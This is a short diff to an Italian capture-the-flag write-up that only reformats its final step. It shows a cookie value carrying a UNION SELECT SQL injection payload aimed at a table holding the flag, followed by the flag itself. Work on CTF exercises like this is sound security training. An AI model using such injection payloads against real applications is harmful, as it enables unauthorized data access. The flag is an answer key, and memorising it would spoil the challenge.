@@ -30,4 +30,7 @@ Abbiamo trovato che esiste una tabella chiamata così, non ci resta che iniettar
 ```json
 {"ID": "0 union select * from here_is_the_flag"}
 ```
-Inviando questo cookie il risultato è la flag: **_flag{W4sH_y0ur_HaNd5_b3f0Re_e4tin6_c0oki3s!}_**
+Inviando questo cookie il risultato è la flag: 
+```
+flag{W4sH_y0ur_HaNd5_b3f0Re_e4tin6_c0oki3s!}
+```
